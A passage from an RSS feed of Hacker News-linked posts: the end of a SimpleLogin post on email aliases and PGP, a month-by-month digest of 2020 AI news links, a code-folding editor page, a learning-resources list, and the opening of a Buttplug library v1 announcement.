<p><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy</a> (PGP) was created in 1991 as a way to encrypt your emails, texts, files, etc. Used by Edward Snowden, journalists, dissidents, … PGP is highly secure and almost unbreakable.</p>
<p>In PGP, you have 2 keys: the private key that allows you to decrypt the emails and that you should never lose. The public key is public (hence the name) that allows anyone who wants to send you an email to encrypt the email. Only you can then read the encrypted email.</p>
<p>SimpleLogin <a href="https://simplelogin.io/blog/introducing-pgp/">supports PGP</a> and allows you to use PGP on email services that don’t natively support it. For example, you can use PGP on your Gmail using browser extensions like <a href="https://www.mailvelope.com/en">Mailvelope</a> or <a href="https://flowcrypt.com/">FlowCrypt</a> and have SimpleLogin encrypting all emails sent to your Gmail.</p>
<h3 id="security">Security</h3>
<p>Though primarily focused on privacy, email aliases are a good way to increase your online security. Email address is usually used with password as account credential. If you use a different email alias for each website, a bad actor now needs to know both your password and the email alias in order to hack your account.</p>
<h3 id="recommendations">Recommendations</h3>
<p>With multiple advantages over plus sign trick, email aliases is a great tool to protect your online privacy. It’s recommended to use a password manager to help remember the email aliases used on different websites.</p>
<p><a href="https://app.simplelogin.io/auth/register">Sign up</a> for a new SimpleLogin account to explore how email aliases can help protect your online privacy. If you have used email aliases in the past, you might be surprised by how easy it becomes now ;).</p>


    </div>
</div></div>]]>
            </description>
            <link>https://simplelogin.io/blog/email-alias-vs-plus-sign/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561797</guid>
            <pubDate>Mon, 28 Dec 2020 18:38:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI News in 2020: A Digest]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561689">thread link</a>) | @jonbaer
<br/>
December 28, 2020 | https://www.skynettoday.com/digests/year-2020 | <a href="https://web.archive.org/web/*/https://www.skynettoday.com/digests/year-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>        
      
      
      <h4>An overview of the big AI-related stories of 2020</h4>
      
      </div><div>
      <h2 id="overview">Overview</h2>

<p>With 2020 (finally) drawing to a close, it’s a good time to reflect on what happened with AI in the this most weird year. Above is a wordcloud of the most common words used in titles of articles we’ve curated in our <a href="https://lastweekin.ai/">‘Last Week in AI’ newsletter</a> over this past year. This reflects just about 1000 articles that we’ve included in the newsletter in 2020:</p>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/year-2020/counts.png">
 <figcaption> Counts of terms in articles vs time</figcaption>
</figure>

<p>Unsurprisingly, the vague but recognizable term “AI” remained the most popular term to use in article titles, with specifics such as “Deep Learning” or “neural network” remaining comparatively rare:</p>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/year-2020/terminology.png">
 <figcaption> Counts of terms in article titles vs time</figcaption>
</figure>

<p>Digging a bit deeper, we find that Coronavirus and Facial Recognition were the biggest topics of the year, followed by bias, deepfakes, and other topics:</p>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/year-2020/topics.png">
 <figcaption> Counts of terms in article titles vs time</figcaption>
</figure>

<p>But enough overview – let’s go through the most significant articles we’ve curated from the past year, month by month. As in with our newsletter, these articles will be about Advances &amp; Business, Concerns &amp; Hype, Analysis &amp; Policy, and in some cases Expert Opinions &amp; Discussion within the field. They will be presented in chronological order, and represent a curated selection that we believe are particularly noteworthy. Click on the name of the month for the full newsletter release that started out that month.</p>

<h2 id="january"><a href="https://lastweekin.ai/p/2571001_new-article-digest-46">January</a></h2>

<p>Things started pretty calm in 2020, with a lot of discussion about what to expect from AI in the future, and some articles discussing issues with facial recognition and bias which will become a trend throughout the year:</p>

<ul>
  <li><a href="https://www.technologyreview.com/s/614992/ai-ethics-washing-time-to-act/">In 2020, let’s stop AI ethics-washing and actually do something</a></li>
  <li><a href="https://www.nature.com/articles/d41586-019-03822-8">AI shows promise for breast cancer screening</a></li>
  <li>
    <p><a href="https://www.reuters.com/article/us-usa-artificial-intelligence-idUSKBN1Z21PT">U.S. government limits exports of artificial intelligence software</a></p>
  </li>
  <li><a href="https://www.theatlantic.com/technology/archive/2020/01/future-politics-bots-drowning-out-humans/604489/">The Future of Politics Is Robots Shouting at One Another</a></li>
  <li><a href="https://www.technologyreview.com/s/615015/ai-regulatory-principles-us-white-house-american-ai-initiatve/#Echobox=1578413684">The US just released 10 principles that it hopes will make AI safer</a></li>
  <li>
    <p><a href="https://www.technologyreview.com/s/614810/were-fighting-fake-news-ai-bots-by-using-more-ai-thats-a-mistake/">We’re fighting fake news AI bots by using more AI. That’s a mistake.</a></p>
  </li>
  <li><a href="https://bostonreview.net/science-nature-politics/annette-zimmermann-elena-di-rosa-hochan-kim-technology-cant-fix-algorithmic">Technology Can’t Fix Algorithmic Injustice</a></li>
  <li><a href="https://www.nytimes.com/2020/01/18/technology/clearview-privacy-facial-recognition.html">The Secretive Company That Might End Privacy as We Know It</a></li>
  <li><a href="https://thenextweb.com/artificial-intelligence/2020/01/17/why-using-ai-to-screen-job-applicants-is-almost-always-a-bunch-of-crap/">Why using AI to screen job applicants is almost always a bunch of crap</a></li>
</ul>

<h2 id="february"><a href="https://lastweekin.ai/p/2591009_new-article-digest-50">February</a></h2>

<p>February saw more discussions of the negative impacts of AI, along with some pieces highlighting efforts to use it for good, and the begginings of AI being connected to the Coronavirus pandemic:</p>

<ul>
  <li><a href="https://www.stanforddaily.com/2020/01/27/ai-for-good-talk-pushes-tech-usage-to-mitigate-humans-environmental-impact/">“AI for Good” talk pushes tech usage to mitigate humans’ environmental impact</a></li>
  <li><a href="https://www.zdnet.com/article/microsoft-takes-the-wraps-off-40-million-five-year-ai-for-health-initiative/">Microsoft takes the wraps off $40 million, five-year ‘AI for Health’ initiative</a></li>
  <li><a href="https://www.buzzfeednews.com/article/ryanmac/clearview-ai-cops-run-wild-facial-recognition-lawsuits">Facial Recognition Startup Clearview AI Is Struggling To Address Complaints As Its Legal Issues Mount</a></li>
  <li><a href="https://www.technologyreview.com/f/615114/a-study-of-youtube-comments-shows-how-its-turning-people-onto-the-alt-right/">YouTube’s algorithm seems to be funneling people to alt-right videos</a></li>
  <li>
    <p><a href="https://www.nytimes.com/2020/01/29/technology/warehouse-robot.html">A Warehouse Robot Learns to Sort Out the Tricky Stuff</a></p>
  </li>
  <li><a href="https://venturebeat.com/2020/02/06/ieee-calls-for-standards-to-combat-climate-change-and-protect-kids-in-the-age-of-ai/">IEEE calls for standards to combat climate change and protect kids in the age of AI</a></li>
  <li><a href="https://www.forbes.com/sites/saibala/2020/02/03/artificial-intelligence-is-not-ready-for-the-intricacies-of-radiology/">Artificial Intelligence Is Not Ready For The Intricacies Of Radiology</a></li>
  <li>
    <p><a href="https://www.scmp.com/tech/start-ups/article/3048746/artificial-intelligence-applications-surge-china-battles-contain">Artificial intelligence applications surge as China battles to contain coronavirus epidemic</a></p>
  </li>
  <li><a href="https://www.forbes.com/sites/patriciagbarnes/2020/02/03/group-asks-federal-trade-commission-to-regulate-use-of-artificial-intelligence-in-pre-employment-screenings/">Group Asks Federal Trade Commission To Regulate Use Of Artificial Intelligence In Pre-Employment Screenings</a></li>
  <li><a href="https://www.technologyreview.com/s/615232/ai-emotion-recognition-affective-computing-hirevue-regulation-ethics/">Emotion AI researchers say overblown claims give their work a bad name</a></li>
  <li>
    <p><a href="https://www.businessinsider.com/facial-recognition-search-clearview-ai-child-abuse-id-2020-2">The controversial facial recognition tech from Clearview AI is also being used to identify child victims of sexual abuse</a></p>
  </li>
  <li><a href="https://www.technologyreview.com/s/615181/ai-openai-moonshot-elon-musk-sam-altman-greg-brockman-messy-secretive-reality/">The messy, secretive reality behind OpenAI’s bid to save the world</a></li>
  <li><a href="https://www.wired.com/story/drive-los-angeles-police-track-every-move/">If You Drive in Los Angeles, Police Can Track Your Every Move</a></li>
  <li><a href="https://www.vox.com/future-perfect/2020/2/14/21063487/self-driving-cars-autonomous-vehicles-waymo-cruise-uber">It’s 2020. Where are our self-driving cars?</a></li>
  <li><a href="https://www.vice.com/en_in/article/jgedjb/the-first-use-of-deepfakes-in-indian-election-by-bjp">We’ve Just Seen the First Use of Deepfakes in an Indian Election Campaign</a></li>
</ul>

<h2 id="march"><a href="https://lastweekin.ai/p/2611449_new-article-digest-54">March</a></h2>

<p>March was a big month with three stories standing out.
First is the closing of <strong>Starsky Robotics</strong>, a promising startup that worked on self-driving trucks.
In a detailed blog post, the founder discussed the immense challenges in technology, safety, and economics that face the autonomous driving industry.</p>

<ul>
  <li><a href="https://medium.com/starsky-robotics-blog/the-end-of-starsky-robotics-acb8a6a8a5f5">The End of Starsky Robotics</a></li>
</ul>

<p>Second is the publicity of <strong>Clearview AI</strong>, which violated many ethical and legal norms by scraping pictures of faces on the Internet to power its facial recognition system that allows its customers, from law enforcement to retail chains, to search for anyone with a picture of their face.</p>

<ul>
  <li><a href="https://www.buzzfeednews.com/article/ryanmac/clearview-ai-fbi-ice-global-law-enforcement">Clearview’s Facial Recognition App Has Been Used By The Justice Department, ICE, Macy’s, Walmart, And The NBA</a></li>
  <li><a href="https://www.vice.com/en_us/article/k7exem/banjo-ai-company-utah-surveillance-panopticon">This Small Company Is Turning Utah Into a Surveillance Panopticon</a></li>
  <li><a href="https://onezero.medium.com/i-got-my-file-from-clearview-ai-and-it-freaked-me-out-33ca28b5d6d4">I Got My File From Clearview AI, and It Freaked Me Out</a></li>
</ul>

<p>Lastly is the flood of reports on the fast-developing <strong>Covid-19</strong> and the roles AI/robotics can (and cannot) play to help alleviate the pandemic.</p>

<ul>
  <li><a href="https://www.vox.com/recode/2020/2/27/21156358/surveillance-tech-coronavirus-china-facial-recognition">Coronavirus is the first big test for futuristic tech that can prevent pandemics</a></li>
  <li><a href="https://www.technologyreview.com/s/615351/ai-could-help-with-the-next-pandemicbut-not-with-this-one/">AI could help with the next pandemic–but not with this one</a></li>
  <li><a href="https://www.technologyreview.com/s/615360/cdc-cmu-forecasts-coronavirus-spread/">This is how the CDC is trying to forecast coronavirus’s spread</a></li>
  <li><a href="https://www.scmp.com/news/china/science/article/3076259/should-ai-help-make-life-or-death-decisions-coronavirus-fight">Should AI help make life-or-death decisions in the coronavirus fight?</a></li>
  <li><a href="https://www.wsj.com/articles/biotech-companies-tap-ai-to-speed-path-to-coronavirus-treatments-11583451564">Biotech Companies Tap AI to Speed Path to Coronavirus Treatments</a></li>
  <li><a href="https://futurism.com/adorable-self-driving-vans-are-disinfecting-roads-in-china">Adorable Self-Driving Vans are Disinfecting Roads in China</a></li>
  <li><a href="https://www.therobotreport.com/covid-19-pandemic-prompts-more-robot-usage-worldwide/">COVID-19 pandemic prompts more robot usage worldwide</a></li>
  <li><a href="https://www.wired.com/story/covid-19-pandemic-robots/">The Covid-19 Pandemic Is a Crisis That Robots Were Built For</a></li>
  <li><a href="https://www.wired.com/story/robot-jobs-coronavirus/">If Robots Steal So Many Jobs, Why Aren’t They Saving Us Now?</a></li>
</ul>

<h2 id="april"><a href="https://lastweekin.ai/p/2642417_new-article-digest-59">April</a></h2>

<p>April saw a continuation of many stories centered on Covid-19, with some exceptions more related to ethical AI development:</p>

<ul>
  <li><a href="https://www.theguardian.com/science/2020/mar/30/scientists-develop-ai-that-can-turn-brain-activity-into-text">Scientists develop AI that can turn brain activity into text</a></li>
  <li><a href="https://techcrunch.com/2020/04/02/using-ai-responsibly-to-fight-the-coronavirus-pandemic/">Using AI responsibly to fight the coronavirus pandemic</a></li>
  <li><a href="https://news.berkeley.edu/2020/03/30/uc-berkeley-scientists-spin-up-a-robotic-covid-19-testing-lab/">UC Berkeley scientists spin up a robotic COVID-19 testing lab</a></li>
  <li>
    <p><a href="https://www.statnews.com/2020/03/30/debate-over-artificial-intelligence-to-detect-covid-19-in-lung-scans/">Debate flares over using AI to detect Covid-19 in lung scans</a></p>
  </li>
  <li><a href="https://www.weforum.org/agenda/2020/03/covid-19-crisis-artificial-intelligence-creativity/">AI can help with the COVID-19 crisis - but the right human input is key</a></li>
  <li><a href="https://syncedreview.com/2020/03/28/physical-distancing-boosts-ai-powered-online-education-in-china/">Physical Distancing Boosts AI-Powered Online Education in China</a></li>
  <li>
    <p><a href="https://venturebeat.com/2020/04/06/stanford-researchers-propose-ai-in-home-system-that-can-monitor-for-coronavirus-symptoms/">Stanford researchers propose AI in-home system that can monitor for coronavirus symptoms</a></p>
  </li>
  <li><a href="https://www.bloomberg.com/news/articles/2020-04-07/coronavirus-isn-t-stopping-europe-s-push-to-regulate-ai">Even the Pandemic Doesn’t Stop Europe’s Push to Regulate AI</a></li>
  <li><a href="https://www.towardtrustworthyai.com/">Toward Trustworthy AI Development: Mechanisms for Supporting Verifiable Claims</a></li>
  <li><a href="https://www.nytimes.com/2020/04/08/technology/ai-computers-learning-supervised-unsupervised.html">Computers Already Learn From Us. But Can They Teach Themselves?</a></li>
  <li><a href="https://www.nytimes.com/2020/04/10/business/coronavirus-workplace-automation.html">Robots Welcome to Take Over, as Pandemic Accelerates Automation</a></li>
  <li><a href="https://www.wired.com/story/mit-cuts-ties-chinese-ai-firm-human-rights/">MIT Cuts Ties With a Chinese AI Firm Amid Human Rights Concerns</a></li>
  <li><a href="https://theconversation.com/ai-can-tackle-the-climate-emergency-if-developed-responsibly-132908">AI can tackle the climate emergency - if developed responsibly</a></li>
</ul>

<h2 id="may"><a href="https://lastweekin.ai/p/2667421_new-article-digest-63">May</a></h2>

<p>May was much like April, with a lot of focus on Covid-19 and a mix of stories on ethics, jobs, and advancements:</p>

<ul>
  <li><a href="https://www.wired.com/story/artificial-intelligence-wont-save-us-from-coronavirus/">Artificial Intelligence Won’t Save Us From Coronavirus</a></li>
  <li><a href="https://spectrum.ieee.org/automaton/robotics/home-robots/moxie-a-social-robot-for-childhood-development">Meet Moxie, a Social Robot That Helps Kids With Social-Emotional Learning</a></li>
  <li><a href="https://www.theverge.com/2020/4/30/21243038/openai-jukebox-model-raw-audio-lyrics-ai-generated-copyright">OpenAI introduces Jukebox, a new AI model that generates genre-specific music with lyrics</a></li>
  <li><a href="https://fortune.com/2020/04/28/coronavirus-artificial-intelligence-white-house/">How to make sense of 50,000 coronavirus research papers</a></li>
  <li>
    <p><a href="https://venturebeat.com/2020/04/24/the-surge-of-sensationalist-covid-19-ai-research/">The surge of sensationalist COVID-19 AI research</a></p>
  </li>
  <li><a href="https://venturebeat.com/2020/05/05/openai-begins-publicly-tracking-ai-model-efficiency/">OpenAI begins publicly tracking AI model efficiency</a></li>
  <li><a href="https://www.technologyreview.com/2020/05/05/1001142/ai-reinforcement-learning-simulate-economy-fairer-tax-policy-income-inequality-recession-pandemic/">An AI can simulate an economy millions of times to create fairer tax policy</a></li>
  <li><a href="https://www.nytimes.com/2020/04/30/technology/coronavirus-treatment-benevolentai-baricitinib.html">How A.I. Steered Doctors Toward a Possible Coronavirus Treatment</a></li>
  <li>
    <p><a href="https://www.theverge.com/2020/5/7/21251387/clearview-ai-law-enforcement-police-facial-recognition-illinois-privacy-law">Clearview AI to stop selling controversial facial recognition app to private companies</a></p>
  </li>
  <li><a href="https://www.technologyreview.com/2020/05/14/1001716/ai-chatbots-take-call-center-jobs-during-coronavirus-pandemic/#Echobox=1589473087">The pandemic is emptying call centers. AI chatbots are swooping in</a></li>
  <li><a href="https://www.vox.com/recode/2020/5/11/21166291/artificial-intelligence-ai-background-check-checkr-fama">Beware of these futuristic background checks</a></li>
  <li><a href="https://www.engadget.com/pave-self-driving-car-survey-154045444.html">Americans don’t know why they don’t trust self-driving cars</a></li>
  <li><a href="https://aeon.co/ideas/algorithms-associating-appearance-and-criminality-have-a-dark-past">Algorithms associating appearance and criminality have a dark past</a></li>
  <li><a href="https://www.sciencemag.org/news/2020/05/eye-catching-advances-some-ai-fields-are-not-real">Eye-catching advances in some AI fields are not real</a></li>
</ul>

<h2 id="june"><a href="https://lastweekin.ai/p/2689941_new-article-digest-67">June</a></h2>

<p>This month saw the massive protests following <strong>George Floyd</strong>’s killing, leading many to re-examine police conducts in the U.S.
Within the AI community, this often meant questioning police use of facial recognition technologies and the inherent bias in the deployed AI algorithms.
It is under this backdrop that companies like Amazon and IBM put a pause to selling facial recognition software to law enforcement, and many nuanced conversations followed.</p>

<ul>
  <li><a href="https://www.buzzfeednews.com/article/carolinehaskins1/george-floyd-protests-surveillance-technology">Here Are The Minneapolis Police’s Tools To Identify Protesters</a></li>
  <li><a href="https://www.nytimes.com/2020/06/24/technology/facial-recognition-arrest.html">Wrongfully Accused by an Algorithm</a></li>
  <li><a href="https://www.nytimes.com/2020/06/09/technology/facial-recognition-software.html">A Case for Banning Facial Recognition</a></li>
  <li><a href="https://www.technologyreview.com/2020/06/12/1003482/amazon-stopped-selling-police-face-recognition-fight/">The two-year fight to stop Amazon from selling face recognition to the police</a></li>
  <li><a href="https://www.aclu.org/press-releases/aclu-statement-amazon-face-recognition-moratorium">ACLU Statement on Amazon Face Recognition Moratorium</a></li>
  <li><a href="https://medium.com/@Joy.Buolamwini/ibm-leads-more-should-follow-racial-justice-requires-algorithmic-justice-and-funding-da47e07e5b58">IBM Leads, More Should Follow: Racial Justice Requires Algorithmic Justice and Funding</a></li>
  <li><a href="https://venturebeat.com/2020/06/26/ai-weekly-a-deep-learning-pioneers-teachable-moment-on-ai-bias/">A deep learning pioneer’s teachable moment on AI bias</a></li>
</ul>

<p>Other news included:</p>

<ul>
  <li><a href="https://www.technologyreview.com/2020/06/18/1003989/ai-deep-learning-startup-neural-magic-uses-cpu-not-gpu/">The startup making deep learning possible without specialized hardware</a></li>
  <li><a href="https://onezero.medium.com/the-worlds-biggest-a-i-conference-is-going-virtual-and-finally-becoming-more-inclusive-81dc5ff554ec">The World’s Biggest A.I. Conference Is Going Virtual, and Finally Becoming More Inclusive</a></li>
  <li><a href="https://www.technologyreview.com/2020/06/04/1002671/startup-ai-workers-productivity-score-bias-machine-learning-business-covid/">This startup is using AI to give workers a “productivity score”</a></li>
</ul>

<h2 id="july"><a href="https://lastweekin.ai/p/4645049_new-article-digest-72">July</a></h2>

<p>This month the publicitly around OpenAI’s <strong>GPT-3</strong>, a very large and flexible language model, began to soar as the company released results from its private-beta trials.
Although the GPT-3 paper was published in May, it wasn’t until now that people started to realize the extent of its potential applications, from writing code to translating legalese, as well as its limitations and potentials for abuse.</p>

<ul>
  <li><a href="https://www.skynettoday.com/briefs/gpt3">GPT-3: An AI Breakthrough, but not Coming for Your Job</a></li>
</ul>

<p>Other news included:</p>

<ul>
  <li><a href="https://www.vox.com/recode/2020/6/29/21303588/deepfakes-anonymous-artificial-intelligence-welcome-to-chechnya">How deepfakes could actually do some good</a></li>
  <li><a href="https://hai.stanford.edu/blog/ais-carbon-footprint-problem">AI’s Carbon Footprint Problem</a></li>
  <li><a href="https://onezero.medium.com/i-chatted-with-a-therapy-bot-to-ease-my-covid-fears-it-was-bizarre-ccd908264660">I Chatted With a Therapy Bot to Ease My Covid Fears. It Was Bizarre.</a></li>
  <li><a href="https://www.nature.com/articles/d41586-020-02003-2">Don’t ask if artificial intelligence is good or fair, ask how it shifts power</a></li>
  <li><a href="https://venturebeat.com/2020/07/15/mit-researchers-warn-that-deep-learning-is-approaching-computational-limits/">MIT researchers warn that deep learning is approaching computational limits</a></li>
  <li><a href="https://www.statnews.com/2020/07/15/artificial-intelligence-patient-consent-hospitals/">An invisible hand: Patients aren’t being told about the AI systems advising their care</a></li>
  <li><a href="https://www.vogue.com/article/sinead-bovell-model-artificial-intelligence">I Am a Model and I Know That Artificial Intelligence Will Eventually Take My Job</a></li>
  <li><a href="https://www.technologyreview.com/2020/07/24/1005602/ai-hiring-promises-bias-free-job-hopping-prediction/">An AI hiring startup promising bias-free results wants to predict job-hopping</a></li>
</ul>

<h2 id="august"><a href="https://lastweekin.ai/p/4698973_digest-76">August</a></h2>

<p>Next, there was more discussion over GPT-3 kept poping up along with more of the usual concerns about facial recognition, bias, and jobs. Discussion of the Coronavirus has mostly dwindled.</p>

<ul>
  <li><a href="https://www.theverge.com/2020/7/28/21344751/facial-recognition-face-masks-accuracy-nist-study">Face masks are breaking facial recognition algorithms, says new government study</a></li>
  <li><a href="https://www.reuters.com/investigates/special-report/usa-riteaid-software/">Rite Aid deployed facial recognition system in hundreds of U.S. stores</a></li>
  <li>
    <p><a href="https://syncedreview.com/2020/07/30/ai-powered-genderify-platform-shut-down-after-bias-based-backlash/">AI-Powered “Genderify” Platform Shut Down After Bias-Based Backlash</a></p>
  </li>
  <li><a href="https://techcrunch.com/2020/08/02/ai-is-struggling-to-adjust-to-2020/">AI is struggling to adjust to 2020</a></li>
  <li><a href="https://time.com/5876604/machines-jobs-coronavirus/">Millions of Americans Have Lost Jobs in the Pandemic — And Robots and AI Are Replacing Them Faster Than Ever</a></li>
  <li><a href="https://www.theatlantic.com/magazine/archive/2020/09/china-ai-surveillance/614197/">The Panopticon Is Already Here</a></li>
  <li><a href="https://www.wired.com/story/cheap-easy-deepfakes-closer-real-thing/">Cheap, Easy Deepfakes Are Getting …</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.skynettoday.com/digests/year-2020">https://www.skynettoday.com/digests/year-2020</a></em></p>]]>
            </description>
            <link>https://www.skynettoday.com/digests/year-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561689</guid>
            <pubDate>Mon, 28 Dec 2020 18:29:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Browser]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25561688">thread link</a>) | @joubert
<br/>
December 28, 2020 | https://tibleiz.net/code-browser/ | <a href="https://web.archive.org/web/*/https://tibleiz.net/code-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">





<div id="content">
<h2>About</h2>
<p><b>Code Browser</b> is a folding text editor for Linux and Windows, 
designed to hierarchically structure any kind of text file and especially source 
code. It makes navigation through source code faster and easier.

</p><center><img src="https://tibleiz.net/code-browser/images/code-browser.png"></center>

<p>Code Browser is especially designed to keep a good overview of the code of 
large projects, but is also useful for a simple CSS file. 
Ideal if you are fed up of having to scroll through thousands of lines of code.

</p><p>See the <a href="https://tibleiz.net/code-browser/code-folding.html">Introduction to Code Folding</a> page if you
want more information on text folding and the way it is implemented in Code Browser.

</p><p>It supports syntax highlighting for all major languages and custom syntax 
highlighting can also be added.

</p><p>Although Code Browser was initially designed to edit programs, it can 
also be used for different tasks such as plain text outlining or helping to understand
existing source code. I've added a page with suggestions to
<a href="https://tibleiz.net/code-browser/tips.html">take advantage of folding</a>.

<!--[c]-->
</p><h2>License</h2>
<p>Code Browser is released under the GPL v2 License.

</p></div>



</div></div>]]>
            </description>
            <link>https://tibleiz.net/code-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561688</guid>
            <pubDate>Mon, 28 Dec 2020 18:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn new skills]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561492">thread link</a>) | @baobabKoodaa
<br/>
December 28, 2020 | https://www.attejuvonen.fi/learn/ | <a href="https://web.archive.org/web/*/https://www.attejuvonen.fi/learn/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Great learning materials are rare. This is a collection of gems I’ve encountered over the years, presented as a 90’s style web link list, intended for anyone who wants to learn new skills.</p>
<hr>

<p><a href="https://www.coursera.org/learn/machine-learning" target="_blank">Machine Learning Coursera Course</a> by Andrew Ng</p>
<p><strong>Skill:</strong> Machine Learning — learn how to apply existing machine learning techniques, understand why they work, and how to troubleshoot issues.</p>
<p><strong>Type of material:</strong> Videos and coding exercises</p>
<p><strong>Why is it good:</strong> Great interplay between lectures and exercises. Clarity of explanations. Introductory scope. Enough math to understand why these methods work, but not too much.</p>
<hr>

<p><a href="https://cses.fi/book/index.php" target="_blank">Competitive Programmer’s Handbook</a> by Antti Laaksonen</p>
<p><strong>Skill:</strong> Exact algorithms — learn how to invent algorithms for ”code competition” -type problems (problems where exactly-correct answer is required and the main challenge is time or memory complexity).</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> Simplified explanations of many algorithmic techniques and algorithmic problem solving approaches. Unlike most algorithm books, this one is focused on ideas and code, not on the underlying math. This is the ”bible” of Finnish competitive programmers.</p>
<hr>

<p><a href="https://cs.gmu.edu/~sean/book/metaheuristics/" target="_blank">Essentials of Metaheuristics</a> by Sean Luke</p>
<p><strong>Skill:</strong> Optimization algorithms — learn techniques to find ”good enough” solutions for problems where an exactly-correct solution is not required. Typically used when an exact algorithm would be computationally infeasible and machine learning methods can not be applied. For example, route optimization often falls into this category.</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> A practical approach. Scope. Clarity of explanations. I recommend you to read this book while implementing and testing selected approaches on a real problem as you go along.</p>
<hr>

<p><a href="https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg/videos" target="_blank">Introduction to Cryptography</a> by Christof Paar</p>
<p><strong>Skill:</strong> Cryptography</p>
<p><strong>Type of material:</strong> Videos</p>
<p><strong>Why is it good:</strong> Clarity of explanations and visual illustrations. Entertaining presentation style.</p>
<hr>

<p><a href="https://www.datacamp.com/community/tutorials/how-to-become-a-data-scientist" target="_blank">Become a Data Scientist</a> by DataCamp</p>
<p><strong>Skill:</strong> Data Science</p>
<p><strong>Type of material:</strong> Infographic</p>
<p><strong>Why is it good:</strong> The entire field, from all angles, in one beautiful illustration.</p>
<hr>

<p><a href="https://scrimba.com/learn/learnreact" target="_blank">Scrimba React course</a> by Bob Ziroll</p>
<p><strong>Skill:</strong> ReactJS — learn React fundamentals and practical coding skills</p>
<p><strong>Type of material:</strong> Interactive screencasts</p>
<p><strong>Why is it good:</strong> A modern way of combining lecture/presentation -elements and a development environment where you can practice on code exercises. Runs in your browser.</p>
<hr>

<p><a href="https://www.bloomberg.com/opinion/authors/ARbTQlRLRjE/matthew-s-levine" target="_blank">Money Stuff</a> by Matt Levine</p>
<p><strong>Skill:</strong> Finance — learn that everything is securities fraud.</p>
<p><strong>Type of material:</strong> Email newsletter</p>
<p><strong>Why is it good:</strong> Marvelous writing style. Unpacks recent events in finance with simplicity and wit, often connecting them to larger themes that run through the newsletter over time. Hugely entertaining and educational. Also released as web articles if you don’t want to give out your email.</p>
<hr>

<p><a href="https://learningmusic.ableton.com/" target="_blank">Learning Music</a> by Ableton</p>
<p><strong>Skill:</strong> Composing music</p>
<p><strong>Type of material:</strong> Interactive website</p>
<p><strong>Why is it good:</strong> Experiment with composing music directly in your browser. No previous experience required. The tutorial begins with simple composing examples and tasks along with teaching basic fundamentals of music.</p>
<hr>
<br></div></div></div>]]>
            </description>
            <link>https://www.attejuvonen.fi/learn/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561492</guid>
            <pubDate>Mon, 28 Dec 2020 18:13:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buttplug (Sex Toy Control Library) Hits v1 Milestone]]>
            </title>
            <description>
<![CDATA[
Score 311 | Comments 125 (<a href="https://news.ycombinator.com/item?id=25561392">thread link</a>) | @qdot76367
<br/>
December 28, 2020 | https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/ | <a href="https://web.archive.org/web/*/https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		
<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>



<figure><img loading="lazy" width="640" height="640" src="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png" alt="" srcset="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w" sizes="(max-width: 640px) 100vw, 640px"></figure>



<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



